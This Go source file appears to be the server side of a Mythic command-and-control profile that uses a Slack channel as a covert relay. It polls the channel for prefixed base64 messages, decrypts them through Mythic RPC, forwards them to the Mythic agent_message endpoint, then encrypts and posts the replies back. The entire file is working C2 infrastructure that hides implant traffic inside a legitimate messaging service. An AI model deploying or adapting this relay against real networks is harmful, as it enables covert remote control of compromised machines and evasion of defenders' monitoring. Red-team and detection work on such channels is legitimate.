package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"sort"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/MythicMeta/MythicContainer/mythicrpc"
	"github.com/MythicMeta/MythicContainer/rabbitmq"
	"github.com/slack-go/slack"
)

const (
	configPath     = "./slack_server_config.json"
	inboundPrefix  = "FWK_IN:"
	outboundPrefix = "FWK_OUT:"
	idleRetryDelay = 15 * time.Second
)

type serverConfig struct {
	BotToken     string `json:"bot_token"`
	ChannelID    string `json:"channel_id"`
	PollInterval int    `json:"poll_interval"`
}

type serverState struct {
	mu sync.Mutex
}

type envelope struct {
	UUID string
	Body []byte
}

type slackService struct {
	client *slack.Client
	cfg    serverConfig
	state  *serverState
	lastTS string
}

func main() {
	log.SetFlags(log.LstdFlags | log.LUTC)
	log.Println("slack internal server starting")

	rabbitmq.Initialize()

	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer stop()

	state := &serverState{}

	for {
		if ctx.Err() != nil {
			return
		}

		cfg, err := loadConfig()
		if err != nil {
			log.Printf("waiting for slack config: %v", err)
			select {
			case <-ctx.Done():
				return
			case <-time.After(idleRetryDelay):
			}
			continue
		}

		service := newSlackService(cfg, state)
		if err := service.bootstrap(); err != nil {
			log.Printf("slack bootstrap failed: %v", err)
			select {
			case <-ctx.Done():
				return
			case <-time.After(idleRetryDelay):
			}
			continue
		}

		log.Printf("slack internal server ready for channel %s", cfg.ChannelID)
		if err := service.run(ctx); err != nil && !errors.Is(err, context.Canceled) {
			log.Printf("slack internal server loop error: %v", err)
			select {
			case <-ctx.Done():
				return
			case <-time.After(idleRetryDelay):
			}
		}
	}
}

func loadConfig() (serverConfig, error) {
	cfg := serverConfig{}
	data, err := os.ReadFile(configPath)
	if err != nil {
		return cfg, err
	}
	if err := json.Unmarshal(data, &cfg); err != nil {
		return cfg, err
	}
	if cfg.BotToken == "" || cfg.ChannelID == "" {
		return cfg, fmt.Errorf("slack config is missing bot token or channel id")
	}
	if cfg.PollInterval <= 0 {
		cfg.PollInterval = 5
	}
	return cfg, nil
}

func newSlackService(cfg serverConfig, state *serverState) *slackService {
	return &slackService{
		client: slack.New(cfg.BotToken),
		cfg:    cfg,
		state:  state,
	}
}

func (s *slackService) bootstrap() error {
	params := &slack.GetConversationHistoryParameters{
		ChannelID: s.cfg.ChannelID,
		Limit:     1,
	}
	history, err := s.client.GetConversationHistory(params)
	if err != nil {
		return err
	}
	if len(history.Messages) > 0 {
		s.lastTS = history.Messages[0].Timestamp
	}
	return nil
}

func (s *slackService) run(ctx context.Context) error {
	ticker := time.NewTicker(time.Duration(s.cfg.PollInterval) * time.Second)
	defer ticker.Stop()

	for {
		if err := s.pollOnce(); err != nil {
			log.Printf("slack poll error: %v", err)
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-ticker.C:
		}
	}
}

func (s *slackService) pollOnce() error {
	params := &slack.GetConversationHistoryParameters{
		ChannelID: s.cfg.ChannelID,
		Limit:     25,
		Inclusive: false,
		Oldest:    s.lastTS,
	}
	history, err := s.client.GetConversationHistory(params)
	if err != nil {
		return err
	}
	if len(history.Messages) == 0 {
		return nil
	}
	sort.Slice(history.Messages, func(i, j int) bool {
		return history.Messages[i].Timestamp < history.Messages[j].Timestamp
	})

	for _, msg := range history.Messages {
		if msg.Timestamp > s.lastTS {
			s.lastTS = msg.Timestamp
		}
		if !strings.HasPrefix(msg.Text, outboundPrefix) {
			continue
		}

		encoded := strings.TrimSpace(strings.TrimPrefix(msg.Text, outboundPrefix))
		reply, err := s.handleEnvelope(encoded)
		if err != nil {
			log.Printf("slack message processing error: %v", err)
			continue
		}
		if reply == "" {
			continue
		}
		if _, _, err := s.client.PostMessage(s.cfg.ChannelID, slack.MsgOptionText(inboundPrefix+reply, false)); err != nil {
			log.Printf("failed to post slack response: %v", err)
		}
	}
	return nil
}

func (s *slackService) handleEnvelope(encoded string) (string, error) {
	env, decoded, err := decryptEnvelope("slack", encoded)
	if err != nil {
		return "", err
	}

	mythicHost := os.Getenv("MYTHIC_SERVER_HOST")
	if mythicHost == "" {
		mythicHost = "127.0.0.1"
	}
	mythicPort := os.Getenv("MYTHIC_SERVER_PORT")
	if mythicPort == "" {
		mythicPort = "17443"
	}
	url := fmt.Sprintf("http://%s:%s/api/v1.4/agent_message", mythicHost, mythicPort)

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(decoded))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("mythic", "slack")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("mythic returned status code %d", resp.StatusCode)
	}

	responseBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	if len(responseBody) == 0 {
		return "", nil
	}

	return encryptEnvelope(env.UUID, "slack", responseBody)
}

func decryptEnvelope(c2Profile, encoded string) (*envelope, []byte, error) {
	raw, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, nil, err
	}
	if len(raw) < 36 {
		return nil, nil, fmt.Errorf("encoded envelope too short")
	}
	uuid := string(raw[:36])
	resp, err := mythicrpc.SendMythicRPCCallbackDecryptBytes(mythicrpc.MythicRPCCallbackDecryptBytesMessage{
		AgentCallbackUUID: uuid,
		Message:           []byte(encoded),
		IncludesUUID:      true,
		IsBase64Encoded:   true,
		C2Profile:         c2Profile,
	})
	if err != nil {
		return nil, nil, err
	}
	if !resp.Success {
		return nil, nil, fmt.Errorf("decrypt failed: %s", resp.Error)
	}
	return &envelope{UUID: uuid, Body: resp.Message}, resp.Message, nil
}

func encryptEnvelope(uuid, c2Profile string, message []byte) (string, error) {
	resp, err := mythicrpc.SendMythicRPCCallbackEncryptBytes(mythicrpc.MythicRPCCallbackEncryptBytesMessage{
		AgentCallbackUUID:   uuid,
		Message:             message,
		IncludeUUID:         true,
		Base64ReturnMessage: true,
		C2Profile:           c2Profile,
	})
	if err != nil {
		return "", err
	}
	if !resp.Success {
		return "", fmt.Errorf("encrypt failed: %s", resp.Error)
	}
	return string(resp.Message), nil
}

